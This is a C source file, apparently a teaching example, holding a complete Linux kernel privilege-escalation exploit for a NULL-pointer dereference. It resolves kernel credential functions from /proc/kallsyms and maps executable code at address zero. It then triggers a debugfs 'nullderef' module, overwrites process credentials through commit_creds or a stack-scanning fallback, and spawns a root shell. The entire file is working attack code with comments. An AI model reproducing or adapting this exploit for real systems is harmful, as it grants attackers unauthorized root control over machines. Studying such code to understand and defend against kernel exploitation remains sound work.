#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

int uid, gid;

/* Find a kernel symbol in /proc/kallsyms */
void *get_ksym(char *name) {
    FILE *f = fopen("/proc/kallsyms", "rb");
    char c, sym[512];
    void *addr;
    int ret;

    while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
        if (!strcmp(sym, name))
            return addr;
    }
    return NULL;
}

/* This is the pattern-matching trick for older kernels. */
void old_get_root(void) {
    int i;
    unsigned *p = *(unsigned**)(((unsigned long)&i) & ~8191);

    for (i = 0; i < 1024-13; i++) {
        if (p[0] == uid && p[1] == uid &&
            p[2] == uid && p[3] == uid &&
            p[4] == gid && p[5] == gid &&
            p[6] == gid && p[7] == gid) {
            p[0] = p[1] = p[2] = p[3] = 0;
            p[4] = p[5] = p[6] = p[7] = 0;
            p = (unsigned *) ((char *)(p + 8) + sizeof(void *));
            p[0] = p[1] = p[2] = ~0;
            break;
        }
        p++;
    }
}

/* This function will be executed in kernel mode. */
void get_root(void) {
    if (commit_creds && prepare_kernel_cred)
        commit_creds(prepare_kernel_cred(0));
    else
        old_get_root();
}

int main() {
  uid = getuid(); gid = getgid();
  setresuid(uid, uid, uid);
  setresgid(gid, gid, gid);

  prepare_kernel_cred = get_ksym("prepare_kernel_cred");
  commit_creds        = get_ksym("commit_creds");

  /* Put a pointer to our function at NULL */
  mmap(0, 4096, PROT_READ|PROT_WRITE,
       MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  void (**fn)(void) = NULL;
  *fn = get_root;

  /* Trigger the kernel */
  int fd = open("/sys/kernel/debug/nullderef/null_call", O_WRONLY);
  write(fd, "1", 1);
  close(fd);

  if (getuid() == 0) {
      char *argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);
  }

  fprintf(stderr, "Something went wrong?\n");
  return 1;
}
